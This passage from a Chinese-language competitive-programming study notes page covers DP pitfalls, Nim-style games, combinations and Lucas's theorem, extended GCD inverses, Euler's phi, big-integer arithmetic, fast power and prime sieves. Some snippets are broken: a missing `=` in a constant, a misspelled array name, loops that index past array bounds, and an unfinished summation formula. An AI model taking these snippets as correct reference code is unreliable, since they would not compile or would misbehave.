class="hljs-built_in">size</span>()) &#123;<br>    <span class="hljs-built_in">dfs</span>(s, l, j - <span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">// n^2 + l - r遍历 == n^3</span><br></code></pre></td></tr></table></figure><h3 id="环">环</h3><p><img src="/images/circle-1.png" alt="image-20220326223751746" style="zoom:50%;" /></p><h3 id="易错">易错</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 容易忽略冗余的状态 leetcode-1977</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>    <span class="hljs-comment">// 这里j定义为长度，但由于f[i][j]的定义为小于等于j，累加仍然需要，与括号匹配类似，&quot;不合理&quot;的dp不带f[i][j]是不合理，且有时候有些dp需要预留位置。</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j++) &#123;<br>    <span class="hljs-comment">// 若使用 for (int j = 1; j &lt;= i; j++) 对于 i = 4, j = 3, 存在f[1][2]这种情况，dp[1][2]不合理不代表f[1][2]无意义</span><br>        <span class="hljs-type">int</span> id1 = i - j, id2 = i - <span class="hljs-number">2</span> * j;<br>        <span class="hljs-keyword">if</span> (id1 &gt;= <span class="hljs-number">0</span> &amp;&amp; num[id1] != <span class="hljs-string">&#x27;0&#x27;</span>) dp[i][j] = f[id1][j - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">if</span> (id2 &gt;= <span class="hljs-number">0</span> &amp;&amp; num[id1] != <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; num[id2] != <span class="hljs-string">&#x27;0&#x27;</span>) &#123;<br>            <span class="hljs-type">int</span> vv = v[id1 + <span class="hljs-number">1</span>][id2 + <span class="hljs-number">1</span>], v1 = id1 + vv, v2 = id2 + vv;<br>            <span class="hljs-keyword">if</span> (v1 &lt; id1 + j &amp;&amp; num[v2] &lt; num[v1]) dp[i][j] = (dp[i][j] + dp[id1][j]) % MOD;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v1 &gt;= id1 + j) dp[i][j] = (dp[i][j] + dp[id1][j]) % MOD; <br>        &#125;<br>        f[i][j] = (f[i][j - <span class="hljs-number">1</span>] + dp[i][j]) % MOD;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="博弈论">博弈论</h2><h3 id="igc博弈">IGC博弈</h3><p>经典的Bash, Wythoff 以及Nim博弈问题,都属于所谓的公平组合博弈(Impartial Combinatorial Games, ICG),ICG具有的的特征/性质如下(用局势(position)描述游戏中的一个状态):</p><p><img src="/images/game-1.png" alt="image-20220329101921911" style="zoom: 67%;" /></p><p>枚举分析, 转化状态, 找规律：</p><h4 id="枚举状态">枚举状态</h4><p>剩下3堆石子（1,1,k）、（1,k,k）和（k,k,k）都是必胜态【都可以留下（k,k）必败态给对手】，接下来对于任一个（a,b,c）都可以转化为（k+m, k+n, k+p）而对于m，有3种情况，分别是 ① 三者相等，就是（k’,k’,k’），为必胜态。 ②两者相等, 这样把k+m取完，留下必败态给对手，也是必胜态。 ③三者不等，这种情况非常复杂，用简单的公式难以表达，我们可以观察到（1,2,3）是必败态，但是（1,2,4）是必胜态，两者只是相差一个石子。</p><h4 id="推理">推理</h4><ol type="1"><li>? 异或的规律</li><li>总能从先手必胜态-&gt;后手必败态</li><li>反证矛盾, 先手当前状态不可能失败</li></ol><h3 id="极大极小">极大极小</h3><p>MIN_MAX</p><p>lq - 异或序列</p><ol type="1"><li>从高位bit开始, bit == 1 直接获胜</li><li>bit 为奇数，且总数为奇数 - 胜利</li><li>! bit为奇数，总数为偶数 - 失败 (可以选择其他，知道不得不选)</li></ol><h2 id="数论">数论</h2><h3 id="误差分析">误差分析</h3><p>** l-2117 abbreviating-the-product-of-a-range 误差分析<img src="/images/error.png" style="zoom: 50%;" /></p><p>乘法转对数，利用double可以自动四舍五入</p><h3 id="组合">组合</h3><p>一步dp<br />1<br />1 1<br />1 2 1<br />1 3 3 1</p><p>回推状态转移 映射到杨辉三角中<br />通过杨辉三角一次向右逆向展开，也就得到了杨辉三角上一列和的表达式</p><p><span class="math display">\[    \sum_{i = 0} ^{k} C_{n + i}^n = C_{}\]</span></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn = <span class="hljs-number">61</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> C[maxn][maxn] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">make_c</span><span class="hljs-params">()</span> </span>&#123;<br>    C[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= maxn; i++) &#123;<br>        C[i][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= maxn; j++) &#123;<br>            C[i][j] = C[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + C[i - <span class="hljs-number">1</span>][j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// lucas定理 </span><br><span class="hljs-comment">// mod = 1e5 时</span><br>LL fact[maxn+<span class="hljs-number">5</span>];<br>LL a[maxn+<span class="hljs-number">10</span>];<br>LL inv[maxn+<span class="hljs-number">10</span>];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>&#123;<br>    a[<span class="hljs-number">0</span>] = a[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    fact[<span class="hljs-number">0</span>] = fact[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    inv[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= maxn; i++)<br>    &#123;<br>        fact[i] = fact[i<span class="hljs-number">-1</span>] * i % mod;<br>        inv[i] = (mod - mod/i) * inv[mod%i]%mod;<br>        a[i] = a[i<span class="hljs-number">-1</span>] * inv[i] % mod;<br>    &#125;<br>&#125;<br><br><span class="hljs-function">LL <span class="hljs-title">C</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> m)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> fact[n]*a[n-m]%mod*a[m]%mod;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="逆元">逆元</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// rsa 解密 求乘法逆元</span><br><span class="hljs-comment">// 辗转相除</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">exgcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span>&amp; x, <span class="hljs-type">int</span>&amp; y)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) &#123;<br>    x = <span class="hljs-number">1</span>, y = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>    <span class="hljs-comment">// x = y, y = x - a / b * y;</span><br>  <span class="hljs-built_in">exgcd</span>(b, a % b, y, x);<br>  y -= a / b * x;<br>&#125;<br><br><span class="hljs-comment">// 32 to 127 chr</span><br><span class="hljs-comment">// 加 mod</span><br>e = (x % m + m) % m;<br><br></code></pre></td></tr></table></figure><h3 id="质因子">质因子</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">euler_phi</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br><span class="hljs-type">int</span> ans = n;<br>    <span class="hljs-comment">// 注意i = 2</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i * i &lt;= n; i++)<br><span class="hljs-keyword">if</span> (n % i == <span class="hljs-number">0</span>) &#123;<br>ans = ans / i * (i - <span class="hljs-number">1</span>);<br><span class="hljs-keyword">while</span> (n % i == <span class="hljs-number">0</span>) n /= i;<br>    &#125;<br><span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) ans = ans / n * (n - <span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="大数运算">大数运算</h3><h4 id="大整数">大整数</h4><p>大数除法 - 大数乘法 (FFT?)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 注意&#x27;1&#x27;而非 1</span><br><span class="hljs-keyword">if</span> (mid == <span class="hljs-number">0</span> &amp;&amp; a[mid] == <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>&#125;<br><br><span class="hljs-comment">// 大整数加减法 大数 - 小数</span><br><span class="hljs-comment">// carry 表示借位</span><br><span class="hljs-type">int</span> carry = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = A.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; --i) &#123;<br>    <span class="hljs-comment">// 减去借位 加法则加入，注意最后会多一位</span><br>    <span class="hljs-type">int</span> tmp = A[i] - carry;<br>    <span class="hljs-comment">// 注意越界</span><br>    <span class="hljs-keyword">if</span> (i &lt; B.<span class="hljs-built_in">size</span>()) tmp = tmp - B[i];<br><span class="hljs-comment">// 纠正负数</span><br>    ans.<span class="hljs-built_in">push_back</span>((tmp + <span class="hljs-number">10</span>) % <span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">if</span> (tmp &lt; <span class="hljs-number">0</span>)  carry = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span> carry = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 如果高位都是0，则要将这些前导0都要删掉，如果最后结果就是0，则最后一个0不能弹出</span><br><span class="hljs-comment">// 加法注意添加1</span><br><span class="hljs-keyword">while</span> (ans.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">1</span> &amp;&amp; ans.<span class="hljs-built_in">back</span>() == <span class="hljs-number">0</span>) &#123;<br>    ans.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><br><span class="hljs-comment">// 大整数乘除法 </span><br><span class="hljs-comment">// 乘法 v * b 判断b==0, 记录进位 </span><br><span class="hljs-comment">// 多项式fft - 二分...</span><br><span class="hljs-keyword">for</span>( i = <span class="hljs-number">0</span>; i &lt; len1; ++ i) &#123;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; len2 || b; ++ j) &#123;<br>        <span class="hljs-comment">// 注意初始化0</span><br>        <span class="hljs-type">int</span> t = ans[i + j] + str1[i] * str2[j] + b;<br>        ans[i + j] = t % <span class="hljs-number">10</span>;<br>        <span class="hljs-comment">// 进位</span><br>        b = t / <span class="hljs-number">10</span>;<br>    &#125;<br>    len = i+j<span class="hljs-number">-1</span>  <span class="hljs-comment">//最终的位数</span><br>&#125;<br><br><span class="hljs-comment">// r为余数 最后一起去除前导零（！非前导需保留）</span><br><span class="hljs-comment">// 竖式除法</span><br>r = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; A.<span class="hljs-built_in">size</span>(); i++)&#123;<br>    <span class="hljs-comment">// 生成新数</span><br>    r = r * <span class="hljs-number">10</span> + A[i];<br>    <span class="hljs-comment">// 除前导0都要保留</span><br>    q.<span class="hljs-built_in">push_back</span>(r / b);<br>    <span class="hljs-comment">// 保留余数</span><br>    r = r % b;<br>&#125;<br><span class="hljs-comment">// 前导零</span><br><span class="hljs-built_in">reverse</span>(q.<span class="hljs-built_in">begin</span>(), q.<span class="hljs-built_in">end</span>());<br><span class="hljs-keyword">while</span> (q.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">1</span> &amp;&amp; q.<span class="hljs-built_in">back</span>() == <span class="hljs-number">0</span>) &#123;<br>    q.<span class="hljs-built_in">pop_back</span>();<br>&#125;<br><br><span class="hljs-comment">// 大整数减法优化</span><br><span class="hljs-comment">// 二分估计 log2大整数 - 位数N </span><br><span class="hljs-comment">// 记录相减，注意位数的对其 通过补0</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SubStract</span><span class="hljs-params">( <span class="hljs-type">int</span> *p1, <span class="hljs-type">int</span> *p2, <span class="hljs-type">int</span> len1, <span class="hljs-type">int</span> len2 )</span></span>&#123;&#125;<br><span class="hljs-comment">// 将除数扩大，使得除数和被除数位数相等</span><br><span class="hljs-keyword">for</span> ( i=len1<span class="hljs-number">-1</span>; i&gt;=<span class="hljs-number">0</span>; i-- ) &#123;<br>    <span class="hljs-keyword">if</span> ( i&gt;=nTimes )<br>        num_b[i] = num_b[i-nTimes];<br>    <span class="hljs-keyword">else</span>                     <br>        num_b[i] = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 重复调用，同时记录减成功的位数</span><br><span class="hljs-keyword">for</span>( j=<span class="hljs-number">0</span>; j &lt;= nTimes; j++) &#123;<br>    <span class="hljs-comment">// 相同位数减k次</span><br><span class="hljs-keyword">while</span>((nTemp = <span class="hljs-built_in">SubStract</span>(num_a,num_b + j,len1,len2 - j)) &gt;= <span class="hljs-number">0</span>) &#123;<br>        len1 = nTemp;<br>        <span class="hljs-comment">// 每成功减一次，将商的相应位加1</span><br>num_c[nTimes-j]++;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="快速乘幂">快速乘/幂</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// ! extend gcd 不可以使用ull 存在负值 ull a &gt; -1 恒成立</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> ull <span class="hljs-title">mul</span><span class="hljs-params">(ull a, ull b, ull mod)</span></span>&#123;<br>    ull ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>( b &gt; <span class="hljs-number">0</span> )&#123;<br>        <span class="hljs-keyword">if</span>(b &amp; <span class="hljs-number">1</span>) ans = (ans + a) % mod;<br>        a = (a + a) % mod;<br>        b &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function">ull <span class="hljs-title">quick_pow</span><span class="hljs-params">(ull a, ull b, ull mod)</span> </span>&#123;<br>    ull res = <span class="hljs-number">1</span>;<br>    a %= mod;<br>    <span class="hljs-keyword">while</span>(b) &#123;<br>        <span class="hljs-keyword">if</span> (b &amp; <span class="hljs-number">1</span>) res = <span class="hljs-built_in">mul</span>(res, a, mod);<br>        a = <span class="hljs-built_in">mul</span>(a, a, mod); <br>        b &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="素数筛">素数筛</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 质数筛</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn <span class="hljs-number">100005</span>;<br><span class="hljs-type">int</span> visit[maxn];<br>visit[<span class="hljs-number">0</span>] = visit[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-comment">// 埃氏筛法, 合数</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= maxn; i++) &#123;<br>    <span class="hljs-keyword">if</span> (!visite[i]) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i * i; j &lt;= maxn; j += i) &#123;<br>            visit[j] = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 欧拉筛法, 30 = 2*15, 3*10 可能被多次筛选 - 最小质因子 - 欧拉筛</span><br><span class="hljs-type">int</span> visit[maxn];<br><span class="hljs-comment">// 素数</span><br><span class="hljs-type">int</span> prime[maxn];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= maxn; i++) &#123;<br>    <span class="hljs-keyword">if</span> (!visit[i]) &#123;<br>        <span class="hljs-comment">// prime[0] 记录当前素数个数</span><br>        prime[++prime[<span class="hljs-number">0</span>]] = i;<br>    &#125;<br>    <span class="hljs-comment">// prime[j] 表示第j个素数</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= prime[<span class="hljs-number">0</span>] &amp;&amp; i * prime[j] &lt;= maxn; j++) &#123;<br>        visit[i * prime[j]] = <span class="hljs-number">1</span>;<br>        <span class="hljs-comment">// 一定不是最小质因子，break</span><br>        <span class="hljs-keyword">if</span> (i % prime[j] == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 三个公因子相乘的种类数</span><br><span class="hljs-comment">// factor n^3</span><br><span class="hljs-comment">// factor_num(i) + factor_num(a / i)</span><br></code></pre></td></tr></table></figure><h3 id="同余方程">同余方程</h3><p>(快速幂 + 快速乘)</p><p>cf-209 div2 D 遍历无线纸带</p><ol type="1"><li><p>自反性，对称性，传递性, 线性运算， 幂运算</p><p><img src="/images/mod-1.png" alt="image-20220331155354746" style="zoom:50%;" /></p><p><span class="math inline">\(a \equiv b \pmod{m} ⟹ a^n \equivb^n\pmod{m}\)</span></p></li></ol><p><img src="/images/mod-2.png" alt="image-20220331151356347" style="zoom: 67%;" /></p><p>具体解法</p><p><img src="/images/mod-3.png" alt="image-20220331151512291" style="zoom:67%;" /></p><p><img src="/images/mod-4.png" alt="image-20220331155606327" style="zoom:50%;" /></p><p>l-974 subarrays sums divided by k<br />modulus = (sum % k + k) % k(c++)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// a mod b = a - y [x / y] (x)</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">mod</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (a % b + b) % b;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> ull <span class="hljs-title">mul</span><span class="hljs-params">(ull a, ull b, ull mod)</span></span>&#123;<br>    ull ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>( b &gt; <span class="hljs-number">0</span> )&#123;<br>        <span class="hljs-keyword">if</span>(b &amp; <span class="hljs-number">1</span>) ans = (ans + a) % mod;<br>        a = (a + a) % mod;<br>        b &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function">ull <span class="hljs-title">quick_pow</span><span class="hljs-params">(ull a, ull b, ull mod)</span> </span>&#123;<br>    ull res = <span class="hljs-number">1</span>;<br>    a %= mod;<br>    <span class="hljs-keyword">while</span>(b) &#123;<br>        <span class="hljs-keyword">if</span> (b &amp; <span class="hljs-number">1</span>) res = <span class="hljs-built_in">mul</span>(res, a, mod);<br>        a = <span class="hljs-built_in">mul</span>(a, a, mod); <br>        b &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> a;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">gcd</span>(b, a % b);<br>&#125;<br><br><span class="hljs-comment">// rsa 解密 求乘法逆元</span><br><span class="hljs-comment">// 辗转相除</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">exgcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span>&amp; x, <span class="hljs-type">int</span>&amp; y)</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) &#123;<br>    x = <span class="hljs-number">1</span>, y = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>    <span class="hljs-comment">// x = y, y = x - a / b * y;</span><br>  <span class="hljs-built_in">exgcd</span>(b, a % b, y, x);<br>  y -= a / b * x;<br>&#125;<br><br><span class="hljs-comment">// 32 to 127 chr</span><br><span class="hljs-comment">// 加 mod</span><br>e = (x % m + m) % m;<br><br><span class="hljs-comment">// C++ Version</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">euler_phi</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br><span class="hljs-type">int</span> ans = n;<br>    <span class="hljs-comment">// 注意i = 2</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i * i &lt;= n; i++)<br><span class="hljs-keyword">if</span> (n % i == <span class="hljs-number">0</span>) &#123;<br>ans = ans / i * (i - <span class="hljs-number">1</span>);<br><span class="hljs-keyword">while</span> (n % i == <span class="hljs-number">0</span>) n /= i;<br>    &#125;<br><span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>) ans = ans / n * (n - <span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-type">int</span> phi[MAXN];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        <span class="hljs-comment">// 除1外没有数的欧拉函数是本身，所以如果phi[i] = i则说明未被筛到</span><br>        phi[i] = i;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++)<br>        <span class="hljs-keyword">if</span> (phi[i] == i) <span class="hljs-comment">// 未被筛到</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i; j &lt;= n; j += i) <span class="hljs-comment">// 所有含有该因子的数都进行一次操作</span><br>                phi[j] = phi[j] / i * (i - <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>阶乘/因子</p><p>取log long double求阶乘的大小</p><p><img src="/images/factor-1.png" alt="image-20220325120510677" style="zoom:50%;" /></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 